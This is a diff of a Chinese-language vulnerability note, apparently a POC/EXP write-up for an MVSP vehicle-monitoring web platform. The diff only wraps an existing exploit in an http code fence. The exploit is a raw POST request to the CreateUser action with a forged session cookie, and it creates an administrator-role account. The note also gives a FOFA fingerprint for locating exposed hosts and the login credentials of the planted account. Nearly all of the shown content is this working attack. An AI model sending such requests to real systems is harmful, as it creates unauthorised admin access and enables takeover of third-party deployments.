@@ -80,6 +80,7 @@ FOFA：icon_hash="564025728"
 
 POC/EXP：
 
+```http
 POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1
 Host: 127.0.0.1
 Content-Length: 243
@@ -94,6 +95,8 @@ Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
 Connection: close
 
 UserId=&GroupPower=1&VehiclePower=&UserName=test123&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=18181818181&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=cf2004f91f001ff3d422d50ff009c4df
+```
+
 
 使用账号密码登录系统：
 test123/qQq@123456
